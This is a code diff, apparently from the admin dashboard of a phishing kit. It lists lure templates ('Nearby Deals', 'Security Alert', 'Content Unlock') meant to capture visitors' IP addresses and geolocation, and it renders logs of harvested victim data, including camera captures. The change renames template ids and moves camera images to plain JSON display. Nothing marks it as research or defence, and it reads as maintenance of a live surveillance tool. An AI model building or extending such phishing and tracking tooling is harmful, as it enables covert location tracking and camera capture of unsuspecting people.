@@ -18,9 +18,9 @@ const phishingCategories = [
     description: 'Templates designed to capture IP address and attempt geolocation.',
     Icon: MapPin,
     links: [
-      { id: 'loc1', name: 'Template: Nearby Deals', url: '/phishing/location/nearby-deals' },
-      { id: 'loc2', name: 'Template: Security Alert', url: '/phishing/location/security-alert' },
-      { id: 'loc3', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock' },
+      { id: 'nearby-deals', name: 'Template: Nearby Deals', url: '/phishing/location/nearby-deals' },
+      { id: 'security-alert', name: 'Template: Security Alert', url: '/phishing/location/security-alert' },
+      { id: 'content-unlock', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock' },
     ],
     cardColorClass: "bg-blue-50 border-blue-200",
   },
@@ -104,28 +104,14 @@ export default function DashboardPage() {
 
 
   const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {
-    if (type === 'camera' && (data as CameraData)?.imageUrl) {
-      return (
-        <div className="my-2">
-          <p className="font-medium">Captured Image:</p>
-          <Image 
-            src={(data as CameraData).imageUrl} 
-            alt="Captured from camera" 
-            width={200} 
-            height={150} 
-            className="rounded border" 
-            data-ai-hint="security camera"
-          />
-        </div>
-      );
-    }
+    // Removed camera image display logic
     // For location, display city and country if available
     if (type === 'location' && data) {
         const locData = data as LocationData;
-        let displayData = {...locData};
         // City and country are now directly in data, so JSON.stringify will show them
-        return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(displayData, null, 2)}</pre>;
+        return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(locData, null, 2)}</pre>;
     }
+    // Default display for all other types, including camera now
     return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data, null, 2)}</pre>;
   };
 
